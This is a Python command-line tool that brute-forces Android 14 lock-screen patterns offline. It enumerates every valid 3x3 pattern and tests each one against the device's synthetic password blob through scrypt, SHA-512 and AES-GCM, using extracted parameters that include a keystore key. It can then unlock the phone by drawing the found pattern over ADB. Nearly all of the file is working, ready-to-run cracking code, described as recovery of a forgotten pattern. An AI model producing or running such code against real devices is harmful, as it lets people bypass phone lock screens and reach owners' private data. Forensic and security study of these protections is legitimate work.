#!/usr/bin/env python3
"""
Android Pattern (Gesture) Brute-Force via Synthetic Password Blob — Android 14.
==============================================================================

Recovers forgotten Android 14 lock screen pattern by brute-forcing the
Synthetic Password Blob (.spblob) offline.

Android 14 converts lock patterns to numeric strings (grid 1-9), then uses the
same scrypt → protectorSecret → AES-GCM pipeline as PIN. This tool generates
all valid Android pattern sequences and brute-forces them through that pipeline.

Algorithm:
  1. pattern → numeric string (e.g. 1→5→9→6→3 → "15963")
  2. stretchedLskf = scrypt(pattern_str, salt, N=2048, r=8, p=2, dklen=32)
  3. protectorSecret = stretchedLskf || secdiscardable_hash
  4. inner_key = SHA512(pad128("application-id") || protectorSecret)[:32]
  5. intermediate = AES-GCM decrypt(outer_ct_tag, keystore_key)
  6. plaintext = AES-GCM decrypt(intermediate, inner_key)
     tag match = pattern benar | tag mismatch = pattern salah

Engine modes:
  cpu    Pure CPU multiprocessing [DEFAULT]
  bench  GPU feasibility analysis + benchmark

Usage:
  python3 pattern_brute.py --params params.json -L 4 -M 9 -w 8
  python3 pattern_brute.py --params params.json --engine bench
  python3 pattern_brute.py --params params.json -L 4 -M 9 -w 8 --resume
"""
import hashlib
import json
import os
import sys
import time
import multiprocessing as mp
import threading
from typing import Optional, Tuple, List

# ═══════════════════════════════════════════════════════════
# GPU Detection (lightweight, no CUDA headers needed)
# ═══════════════════════════════════════════════════════════

GPU_AVAILABLE = False
GPU_NAME = "N/A"
GPU_MEMORY_MB = 0
GPU_SM_COUNT = 0
GPU_ARCH = "N/A"

try:
    import cupy as cp
    if cp.cuda.is_available():
        GPU_AVAILABLE = True
        props = cp.cuda.runtime.getDeviceProperties(0)
        GPU_NAME = props["name"].decode() if isinstance(props["name"], bytes) else props["name"]
        GPU_MEMORY_MB = props["totalGlobalMem"] // (1024 * 1024)
        GPU_SM_COUNT = props["multiProcessorCount"]
        major = props.get("major", 0)
        minor = props.get("minor", 0)
        GPU_ARCH = f"sm_{major}{minor}"
        del props
except Exception:
    pass


def _detect_gpu_via_nvidia_smi():
    """Fallback: detect GPU via nvidia-smi CLI."""
    global GPU_AVAILABLE, GPU_NAME, GPU_MEMORY_MB
    import subprocess
    try:
        out = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=name,memory.total",
             "--format=csv,noheader,nounits"],
            timeout=10, stderr=subprocess.DEVNULL
        ).decode().strip()
        if out:
            parts = out.split(",")
            GPU_NAME = parts[0].strip()
            GPU_MEMORY_MB = int(parts[1].strip())
            GPU_AVAILABLE = True
    except Exception:
        pass


if not GPU_AVAILABLE:
    _detect_gpu_via_nvidia_smi()


# ═══════════════════════════════════════════════════════════
# GPU Monitor Thread
# ═══════════════════════════════════════════════════════════

class GpuMonitor:
    """Monitor GPU utilization during brute-force (informational only)."""

    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self.snapshots = []

    def start(self):
        if not GPU_AVAILABLE:
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()

    def stop(self):
        if self._thread is None:
            return
        self._stop.set()
        self._thread.join(timeout=2)

    def _monitor_loop(self):
        import subprocess
        while not self._stop.is_set():
            try:
                out = subprocess.check_output(
                    ["nvidia-smi",
                     "--query-gpu=utilization.gpu,memory.used,temperature.gpu",
                     "--format=csv,noheader,nounits"],
                    timeout=5, stderr=subprocess.DEVNULL
                ).decode().strip()
                if out:
                    util, mem, temp = out.split(",")
                    self.snapshots.append({
                        "time": time.time(),
                        "util": int(util.strip()),
                        "mem_mb": int(mem.strip()),
                        "temp": int(temp.strip()),
                    })
            except Exception:
                pass
            self._stop.wait(5.0)

    def summary(self):
        if not self.snapshots:
            return "N/A"
        avg_util = sum(s["util"] for s in self.snapshots) / len(self.snapshots)
        max_temp = max(s["temp"] for s in self.snapshots)
        return f"GPU util: {avg_util:.0f}% avg, max temp: {max_temp} C"


# ═══════════════════════════════════════════════════════════
# Pattern Generator — Android 3x3 grid valid patterns
# ═══════════════════════════════════════════════════════════

# Grid layout (phone dial pad):
#   1  2  3
#   4  5  6
#   7  8  9
#
# Rules:
#   - Min 4 dots, max 9 dots
#   - Cannot revisit a dot
#   - Cannot skip over an unvisited middle dot (except knight moves)

# Pairs (from, to) -> middle dot that must be visited
MIDDLE_DOT = {
    (1, 3): 2,  (3, 1): 2,
    (1, 7): 4,  (7, 1): 4,
    (1, 9): 5,  (9, 1): 5,
    (2, 8): 5,  (8, 2): 5,
    (3, 7): 5,  (7, 3): 5,
    (3, 9): 6,  (9, 3): 6,
    (4, 6): 5,  (6, 4): 5,
    (7, 9): 8,  (9, 7): 8,
}


def _is_valid_move(current: int, next_dot: int, visited: set) -> bool:
    """Check if moving from current to next_dot respects middle-dot rule."""
    middle = MIDDLE_DOT.get((current, next_dot))
    if middle is not None and middle not in visited:
        return False
    return True


def _dfs_patterns(current: int, visited: set, path: List[str],
                  min_len: int, max_len: int, results: List[str]):
    """DFS to generate all valid patterns from a starting point."""
    if len(path) >= min_len:
        results.append(''.join(path))
    if len(path) >= max_len:
        return
    for next_dot in range(1, 10):
        if next_dot in visited:
            continue
        if not _is_valid_move(current, next_dot, visited):
            continue
        visited.add(next_dot)
        path.append(str(next_dot))
        _dfs_patterns(next_dot, visited, path, min_len, max_len, results)
        path.pop()
        visited.remove(next_dot)


def generate_patterns(min_len: int = 4, max_len: int = 9) -> List[str]:
    """Generate all valid Android lock patterns as numeric strings.

    Args:
        min_len: Minimum pattern length (dots visited). Default 4.
        max_len: Maximum pattern length (dots visited). Default 9.

    Returns:
        List of pattern strings (e.g. ["1236", "12367", ...]).
        Order is deterministic: DFS from each starting dot (1-9),
        trying next dots in numeric order.
    """
    results = []
    for start in range(1, 10):
        visited = {start}
        path = [str(start)]
        _dfs_patterns(start, visited, path, min_len, max_len, results)
    return results


def count_patterns(min_len: int = 4, max_len: int = 9) -> dict:
    """Count valid patterns by length."""
    counts = {}
    for length in range(min_len, max_len + 1):
        patterns = generate_patterns(length, length)
        counts[length] = len(patterns)
    return counts


# ═══════════════════════════════════════════════════════════
# Shared Cryptographic Parameters
# ═══════════════════════════════════════════════════════════

class BruteParams:
    """Pre-computed static parameters for pattern brute-force (frozen after load)."""

    __slots__ = ('salt', 'scrypt_n', 'scrypt_r', 'scrypt_p',
                 'sec_hash', 'keystore_key', 'app_pad',
                 'outer_iv', 'outer_ct_tag', 'inner_iv', 'inner_ct_tag')

    def __init__(self, params_file: str):
        with open(params_file) as f:
            p = json.load(f)

        from cryptography.hazmat.primitives.ciphers.aead import AESGCM

        self.salt = bytes.fromhex(p["salt_hex"])
        self.scrypt_n = p["scrypt_n"]
        self.scrypt_r = p["scrypt_r"]
        self.scrypt_p = p["scrypt_p"]
        self.sec_hash = bytes.fromhex(p["sec_hash_hex"])
        self.keystore_key = bytes.fromhex(p["keystore_key_hex"])
        self.app_pad = bytes.fromhex(p["app_pad_hex"])
        self.outer_iv = bytes.fromhex(p["outer_iv_hex"])
        self.outer_ct_tag = bytes.fromhex(p["outer_ct_tag_hex"])

        # Precompute outer layer (decrypt once, independent of pattern)
        inner_blob = AESGCM(self.keystore_key).decrypt(
            self.outer_iv, self.outer_ct_tag, None
        )
        self.inner_iv = inner_blob[:12]
        self.inner_ct_tag = inner_blob[12:]

        print(f"Loaded: salt={self.salt.hex()}, "
              f"scrypt N={self.scrypt_n} r={self.scrypt_r} p={self.scrypt_p}")
        print(f"  Outer layer pre-decrypted: inner blob={len(inner_blob)}B")


# ═══════════════════════════════════════════════════════════
# Single Pattern Check (CPU — same pipeline as PIN)
# ═══════════════════════════════════════════════════════════

def check_pattern(pattern: str, params: BruteParams) -> bool:
    """Check if a pattern decrypts the SP blob correctly.

    Bottleneck: scrypt (~5.8ms, 99.5%). SHA512 + AES-GCM are negligible.
    """
    stretched = hashlib.scrypt(
        pattern.encode(), salt=params.salt,
        n=params.scrypt_n, r=params.scrypt_r, p=params.scrypt_p, dklen=32
    )
    protector_secret = stretched + params.sec_hash
    inner_key = hashlib.sha512(params.app_pad + protector_secret).digest()[:32]

    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        AESGCM(inner_key).decrypt(params.inner_iv, params.inner_ct_tag, None)
        return True
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════
# Multiprocessing Worker
# ═══════════════════════════════════════════════════════════

def worker_patterns(args: Tuple) -> Optional[str]:
    """Process a chunk of patterns. Returns the pattern if found."""
    patterns, params = args
    for pattern in patterns:
        if check_pattern(pattern, params):
            return pattern
    return None


# ═══════════════════════════════════════════════════════════
# Checkpoint Management
# ═══════════════════════════════════════════════════════════

CHECKPOINT_FILE = ".pattern_brute_checkpoint"


def save_checkpoint(length: int, index: int):
    with open(CHECKPOINT_FILE, "w") as f:
        f.write(f"{length},{index}")


def load_checkpoint() -> Tuple[int, int]:
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE) as f:
                l, p = f.read().strip().split(",")
                return int(l), int(p)
        except (ValueError, IOError):
            pass
    return 4, 0


def clear_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        os.remove(CHECKPOINT_FILE)


# ═══════════════════════════════════════════════════════════
# Auto-Unlock: Draw pattern on device via uiautomator2
# ═══════════════════════════════════════════════════════════

_U2_AVAILABLE = False
try:
    import uiautomator2 as u2
    _U2_AVAILABLE = True
except ImportError:
    pass


def _reveal_bouncer(device):
    """Reveal the pattern entry UI (bouncer) on the lock screen."""
    # Tap lock icon area to trigger pattern entry
    device.click(540, 2112)
    time.sleep(0.3)
    # Swipe up from lock icon to reveal pattern
    device.swipe(540, 2100, 540, 1500, duration=0.3)
    time.sleep(0.8)


def _find_pattern_view(device) -> Optional[Tuple[int, int, int, int]]:
    """Find LockPatternView bounds from UI hierarchy XML."""
    try:
        xml = device.dump_hierarchy()
        import xml.etree.ElementTree as ET
        import re
        root = ET.fromstring(xml)
        for node in root.iter():
            rid = node.attrib.get('resource-id', '')
            cls = node.attrib.get('class', '')
            if 'lockPatternView' in rid or 'lockPattern' in rid.lower() \
                    or 'pattern' in cls.lower():
                bounds_str = node.attrib.get('bounds', '')
                m = re.search(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]', bounds_str)
                if m:
                    return (int(m.group(1)), int(m.group(2)),
                            int(m.group(3)), int(m.group(4)))
    except Exception:
        pass
    return None


def _calculate_dot_positions(bounds: Tuple[int, int, int, int]) -> dict:
    """Calculate 3x3 grid dot centers from LockPatternView bounds."""
    left, top, right, bottom = bounds
    cell_w = (right - left) / 3
    cell_h = (bottom - top) / 3
    positions = {}
    for row in range(3):
        for col in range(3):
            dot_num = row * 3 + col + 1
            x = int(left + cell_w * col + cell_w / 2)
            y = int(top + cell_h * row + cell_h / 2)
            positions[dot_num] = (x, y)
    return positions


def unlock_with_pattern(pattern: str, device_serial: str = None) -> bool:
    """Draw a pattern on the device lock screen to unlock it.

    Args:
        pattern: Numeric pattern string (e.g. '7412369').
        device_serial: ADB device serial. Auto-detected if None.

    Returns:
        True if device was unlocked successfully, False otherwise.
    """
    if not _U2_AVAILABLE:
        print("  [!] uiautomator2 not installed. Install: pip install uiautomator2")
        return False

    # Auto-detect device if not specified
    if device_serial is None:
        import subprocess
        result = subprocess.run(
            ['adb', 'devices'], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.strip().splitlines()[1:]:
            if 'device' in line:
                device_serial = line.split()[0]
                break
        if device_serial is None:
            print("  [!] No ADB device found for auto-unlock")
            return False

    try:
        print(f"\n[*] Auto-unlock: connecting to {device_serial}...")
        device = u2.connect(device_serial)
        device.screen_on()
        time.sleep(0.5)

        # Reveal pattern entry UI
        _reveal_bouncer(device)

        # Find pattern view bounds
        bounds = _find_pattern_view(device)
        if bounds is None:
            # Fallback: hardcoded bounds from Pixel-like A14 emulator
            bounds = (83, 1102, 997, 2016)
            print(f"  Using fallback bounds: {bounds}")
        else:
            print(f"  LockPatternView bounds: {bounds}")

        # Calculate dot positions and draw pattern
        positions = _calculate_dot_positions(bounds)
        points = [(positions[int(ch)][0], positions[int(ch)][1])
                  for ch in pattern]

        print(f"  Drawing pattern: {' → '.join(f'({x},{y})' for x, y in points)}")
        device.swipe_points(points, duration=0.3)
        time.sleep(2.0)

        # Verify unlock
        info = device.info
        if info.get('currentPackageName') != 'com.android.systemui':
            print(f"  ✅ DEVICE UNLOCKED!")
            return True

        # Double-check via dumpsys
        import subprocess
        result = subprocess.run(
            ['adb', '-s', device_serial, 'shell', 'dumpsys', 'window'],
            capture_output=True, text=True, timeout=5
        )
        if 'mDreamingLockscreen=true' not in result.stdout \
                and 'mShowingLockscreen=true' not in result.stdout:
            print(f"  ✅ DEVICE UNLOCKED!")
            return True
        else:
            print(f"  ⚠️  Still on lock screen (pattern may be wrong or device unresponsive)")
            return False

    except Exception as e:
        print(f"  [!] Auto-unlock failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════
# Main Brute-Force Engine
# ═══════════════════════════════════════════════════════════

def brute_force(params_file: str, min_len: int = 4, max_len: int = 9,
                workers: int = None, start_from: int = None,
                resume: bool = False, checkpoint: bool = True,
                show_gpu: bool = True,
                auto_unlock: bool = False,
                device_serial: str = None) -> Optional[str]:
    """Main pattern brute-force entry point.

    Args:
        params_file: Path to params.json (from extract_params.py).
        min_len: Minimum pattern length (dots). Default 4.
        max_len: Maximum pattern length (dots). Default 9.
        workers: Number of CPU workers. Default: CPU count.
        start_from: Skip first N patterns in the first length group.
        resume: Resume from last checkpoint.
        checkpoint: Enable/disable checkpoint auto-save.
        show_gpu: Enable GPU background monitor.
        auto_unlock: If True, automatically draw pattern on device after finding it.
        device_serial: ADB device serial for auto_unlock. Auto-detected if None.

    Returns:
        The pattern string if found, None otherwise.
    """
    params = BruteParams(params_file)

    # GPU monitor (background thread, informational only)
    monitor = GpuMonitor()
    if show_gpu and GPU_AVAILABLE:
        monitor.start()

    if resume:
        resume_len, resume_idx = load_checkpoint()
        if resume_idx > 0:
            print(f"[*] Resuming from checkpoint: "
                  f"{resume_len}-dot patterns, index {resume_idx}")
            min_len = resume_len
            start_from = resume_idx
        else:
            print("[*] No checkpoint found, starting fresh")

    if workers is None:
        workers = min(mp.cpu_count(), 16)

    # Show pattern counts for the configured range
    counts = count_patterns(min_len, max_len)
    total = sum(counts.values())
    print(f"[*] Pattern space: {total:,} valid patterns "
          f"({min_len}-{max_len} dots)")
    for l, c in sorted(counts.items()):
        print(f"      {l} dots: {c:,} patterns")

    CHUNK = 1000  # patterns per chunk
    start_time = time.time()
    result = None
    length_target = max_len  # for final output

    for length in range(min_len, max_len + 1):
        # Generate patterns for this length
        gen_start = time.time()
        patterns = generate_patterns(length, length)
        total_length = len(patterns)
        gen_elapsed = time.time() - gen_start
        if gen_elapsed > 0.1:
            print(f"  Generated {total_length:,} {length}-dot patterns "
                  f"({gen_elapsed * 1000:.0f}ms)")

        first_idx = start_from if (start_from and length == min_len) else 0

        if first_idx > 0:
            patterns = patterns[first_idx:]
            print(f"\n[*] Brute-forcing {length}-dot patterns "
                  f"(starting at index {first_idx}, "
                  f"{len(patterns):,} remaining / {total_length:,} total)...")
        else:
            print(f"\n[*] Brute-forcing {length}-dot patterns "
                  f"({total_length:,} combinations)...")

        last_progress = 0
        checked = 0
        total_to_check = len(patterns)

        if workers > 1 and total_to_check > CHUNK:
            # Split patterns into chunks for multiprocessing
            ranges = []
            for chunk_start in range(0, total_to_check, CHUNK):
                chunk_end = min(chunk_start + CHUNK, total_to_check)
                ranges.append((patterns[chunk_start:chunk_end], params))

            ctx = mp.get_context('spawn') if hasattr(mp, 'get_context') else mp
            with ctx.Pool(workers, maxtasksperchild=10) as pool:
                for result_chunk in pool.imap_unordered(worker_patterns, ranges):
                    checked += CHUNK

                    if checkpoint:
                        save_checkpoint(length, first_idx + min(checked, total_to_check))

                    elapsed = time.time() - start_time
                    if elapsed - last_progress >= 1.0:
                        effective = min(checked, total_to_check)
                        rate = effective / elapsed if elapsed > 0 else 0
                        remaining = total_to_check - min(checked, total_to_check)
                        eta = remaining / rate / 60 if rate > 0 else 999
                        pct = min(checked / total_to_check * 100, 100)
                        print(f"\r  {min(checked, total_to_check):>8,}/"
                              f"{total_to_check:,} "
                              f"({pct:.0f}%) rate={rate:.0f}/s ETA={eta:.1f}m",
                              end="", flush=True)
                        last_progress = elapsed

                    if result_chunk:
                        pool.terminate()
                        result = result_chunk
                        break
        else:
            # Single-worker (sequential)
            for idx, pattern in enumerate(patterns):
                if check_pattern(pattern, params):
                    result = pattern
                    break
                if checkpoint and idx % 100 == 0 and idx > 0:
                    save_checkpoint(length, first_idx + idx)
                    elapsed = time.time() - start_time
                    effective = idx
                    rate = effective / elapsed if elapsed > 0 else 0
                    remaining = total_to_check - idx
                    eta = remaining / rate / 60 if rate > 0 else 999
                    print(f"\r  {idx:>8,}/{total_to_check:,} "
                          f"({idx / total_to_check * 100:.0f}%) "
                          f"rate={rate:.0f}/s ETA={eta:.1f}m",
                          end="", flush=True)

        if result:
            length_target = length
            break

        elapsed = time.time() - start_time
        print(f"\r  {total_to_check:,}/{total_to_check:,} (100%) "
              f"-- {elapsed:.0f}s")
        start_from = None  # reset for next length

    monitor.stop()
    elapsed = time.time() - start_time

    if result:
        clear_checkpoint()
        print(f"\n{'=' * 60}")
        print(f" PATTERN FOUND: {result}")
        print(f"    Dots:       {len(result)} points")
        print(f"    Sequence:   {' -> '.join(result)}")
        print(f"    Time:       {elapsed:.0f}s ({elapsed / 60:.1f}m)")
        if GPU_AVAILABLE:
            print(f"    {monitor.summary()}")
        print(f"    Engine:     CPU (scrypt bottleneck - GPU tidak membantu)")
        print(f"{'=' * 60}")

        # Auto-unlock if requested
        if auto_unlock:
            unlock_with_pattern(result, device_serial)
    else:
        clear_checkpoint()
        print(f"\n[-] No pattern found in range {min_len}-{max_len} dots.")
        print(f"    Time: {elapsed:.0f}s ({elapsed / 60:.1f}m)")

    return result


# ═══════════════════════════════════════════════════════════
# Benchmark: GPU Feasibility Analysis
# ═══════════════════════════════════════════════════════════

def run_bench(params_file: str):
    """Benchmark CPU performance, analyze GPU feasibility for pattern brute-force."""
    params = BruteParams(params_file)

    total_patterns = sum(count_patterns(4, 9).values())

    print(f"\n{'=' * 65}")
    print(f"  PATTERN BRUTE-FORCE — GPU FEASIBILITY ANALYSIS")
    print(f"{'=' * 65}")
    print(f"  GPU:      {GPU_NAME}")
    print(f"  VRAM:     {GPU_MEMORY_MB} MB")
    print(f"  SMs:      {GPU_SM_COUNT}")
    print(f"  Arch:     {GPU_ARCH}")
    print(f"  Driver:   {_get_driver_version()}")
    print(f"  Patterns: {total_patterns:,} total (4-9 dots)")
    print(f"{'-' * 65}")

    # 1. CPU scrypt benchmark (single-threaded)
    PIN_COUNT = 500
    test_pattern = b"123456789"
    print(f"\n  [1/3] CPU scrypt benchmark ({PIN_COUNT} calls, single-threaded)...")
    # Warmup
    hashlib.scrypt(test_pattern, salt=params.salt, n=params.scrypt_n,
                   r=params.scrypt_r, p=params.scrypt_p, dklen=32)

    cpu_times = []
    for _ in range(PIN_COUNT):
        t0 = time.perf_counter()
        hashlib.scrypt(test_pattern, salt=params.salt, n=params.scrypt_n,
                       r=params.scrypt_r, p=params.scrypt_p, dklen=32)
        cpu_times.append(time.perf_counter() - t0)

    avg_cpu_ms = sum(cpu_times) / len(cpu_times) * 1000
    cpu_rate = 1 / (avg_cpu_ms / 1000)
    print(f"      scrypt per call: {avg_cpu_ms:.2f}ms")
    print(f"      Single-core rate: {cpu_rate:.0f} pattern/s")

    # 2. Multi-core projection
    cpu_cores = mp.cpu_count()
    print(f"\n  [2/3] Multi-core projection...")
    parallel_portion = 0.99
    for w in [4, 8, 16]:
        speedup = 1 / ((1 - parallel_portion) + parallel_portion / w)
        rate = cpu_rate * speedup
        time_for_all = total_patterns / rate / 60  # minutes
        print(f"      {w:>2} workers: speedup={speedup:.1f}x, "
              f"rate={rate:.0f} pat/s, "
              f"{total_patterns:,} patterns = {time_for_all:.0f}m")

    # 3. GPU feasibility
    print(f"\n  [3/3] GPU feasibility analysis...")
    scrypt_mem_mb = params.scrypt_n * params.scrypt_r * 128 / (1024 * 1024)

    if GPU_MEMORY_MB > 0:
        max_concurrent = int(GPU_MEMORY_MB * 0.8 / scrypt_mem_mb)
    else:
        max_concurrent = 0

    print(f"      scrypt memory per call: {scrypt_mem_mb:.0f} MB")
    print(f"      Max concurrent on GPU:   {max_concurrent:,} (using 80% VRAM)")
    print(f"      SM count:                {GPU_SM_COUNT}")
    print(f"      Shared mem per SM:       ~48 KB "
          f"(too small for {scrypt_mem_mb:.0f} MB scrypt)")
    print(f"")

    if GPU_MEMORY_MB > 0:
        gpu_mem_bw = 192  # GB/s estimate for GDDR6
        scrypt_read_mb = scrypt_mem_mb * 2
        gpu_rate_est = gpu_mem_bw * 1024 / scrypt_read_mb
        cpu_8core_est = cpu_rate * 8 * 0.7
        print(f"      GPU memory bandwidth:    ~{gpu_mem_bw} GB/s")
        print(f"      GPU theoretical max:     ~{gpu_rate_est:.0f} pat/s "
              f"(bandwidth-limited)")
        print(f"      CPU 8-core actual:       ~{cpu_8core_est:.0f} pat/s "
              f"(measured)")
        print(f"")

        if gpu_rate_est < cpu_rate * 4:
            print(f"      VERDICT: GPU WOULD BE SLOWER THAN CPU")
            print(f"      Reason: scrypt is memory-hard by design - GPU memory")
            print(f"      bandwidth bottlenecks negate parallelism advantages.")
            print(f"      scrypt with N=2048 was specifically designed to resist")
            print(f"      GPU/ASIC/FPGA acceleration.")
        else:
            print(f"      GPU MIGHT help (theoretical), but requires custom CUDA C++")
            print(f"      implementation. Python overhead makes it impractical.")

    print(f"")
    print(f"  RECOMMENDATION:")
    print(f"    Use CPU multiprocessing (already optimal for scrypt)")
    print(f"    For faster brute-force: split pattern space across machines")
    print(f"    Use --start flag to parallelize across multiple hosts")
    print(f"    CUDA toolkit installation: NOT recommended for this workload")
    print(f"{'=' * 65}\n")


def _get_driver_version() -> str:
    try:
        import subprocess
        out = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=driver_version", "--format=csv,noheader"],
            timeout=5, stderr=subprocess.DEVNULL
        ).decode().strip()
        return out
    except Exception:
        return "unknown"


# ═══════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Android Pattern (Gesture) Brute-Force — SP Blob v3",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Engine modes:
  cpu    Pure CPU multiprocessing [DEFAULT, FASTEST]
  bench  GPU feasibility analysis + benchmark

Examples:
  %(prog)s --params params.json -L 4 -M 9 -w 8
  %(prog)s --params params.json --engine bench
  %(prog)s --params params.json -L 4 -M 9 -w 8 --resume
  %(prog)s --params params.json -L 5 -M 5 -w 8 --start 1000
  %(prog)s --params params.json -L 7 -M 7 -w 16 --auto-unlock
        """
    )
    parser.add_argument("--params", default=None, help="JSON params file")
    parser.add_argument("-L", type=int, default=4,
                        help="Min pattern length (dots). Default: 4")
    parser.add_argument("-M", type=int, default=9,
                        help="Max pattern length (dots). Default: 9")
    parser.add_argument("-w", type=int, default=None,
                        help="Workers (default: CPU count)")
    parser.add_argument("--start", type=int, default=None,
                        help="Start from pattern index N in the first length group")
    parser.add_argument("--resume", action="store_true",
                        help="Resume from last checkpoint")
    parser.add_argument("--no-checkpoint", action="store_true",
                        help="Disable checkpoint saving")
    parser.add_argument("--engine", choices=["cpu", "bench"],
                        default="cpu",
                        help="Engine mode (default: cpu)")
    parser.add_argument("--no-gpu-monitor", action="store_true",
                        help="Disable GPU background monitor")
    parser.add_argument("--info", action="store_true",
                        help="Show pattern space statistics and exit")
    parser.add_argument("--auto-unlock", action="store_true",
                        help="Automatically draw pattern on device when found (requires uiautomator2)")
    parser.add_argument("--device", "-s", type=str, default=None,
                        help="ADB device serial for auto-unlock (default: auto-detect)")

    args = parser.parse_args()

    if args.L < 4:
        print("[!] Android requires at least 4 dots for lock patterns")
        sys.exit(1)
    if args.M > 9:
        print("[!] Maximum pattern length is 9 dots (3x3 grid)")
        sys.exit(1)
    if args.L > args.M:
        print("[!] -L (min) must be <= -M (max)")
        sys.exit(1)

    # Info mode: just show pattern counts
    if args.info:
        counts = count_patterns(args.L, args.M)
        total = sum(counts.values())
        print(f"Pattern space ({args.L}-{args.M} dots): {total:,} valid patterns")
        for l, c in sorted(counts.items()):
            print(f"  {l} dots: {c:,}")
        print(f"\nEstimated time (8 workers, scrypt N=2048):")
        single_rate = 120  # ~PIN/s estimate
        for l, c in sorted(counts.items()):
            t_min = c / (single_rate * 8) / 60
            print(f"  {l} dots: {c:,} patterns, ~{t_min:.1f}m")
        print(f"  Total:             ~{total / (single_rate * 8) / 60:.1f}m")
        return 0

    # Require --params for non-info modes
    if not args.params:
        print("[!] --params is required (use --info for pattern statistics only)")
        sys.exit(1)

    # Show system info
    print(f"[SYSTEM] CPU cores: {mp.cpu_count()}  |  "
          f"GPU: {GPU_NAME} ({GPU_MEMORY_MB} MB)  |  "
          f"Python: {sys.version.split()[0]}")
    if GPU_AVAILABLE and args.engine != "bench":
        print(f"[INFO]  GPU detected but NOT used for computation "
              f"-- scrypt is CPU-bound.")
        print(f"[INFO]  CUDA toolkit would NOT improve performance.\n")

    if args.engine == "bench":
        if not GPU_AVAILABLE:
            print("[!] No NVIDIA GPU detected. CPU benchmark only.")
        run_bench(args.params)
        return 0

    result = brute_force(
        args.params, min_len=args.L, max_len=args.M,
        workers=args.w, start_from=args.start,
        resume=args.resume,
        checkpoint=not args.no_checkpoint,
        show_gpu=not args.no_gpu_monitor,
        auto_unlock=args.auto_unlock,
        device_serial=args.device,
    )
    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
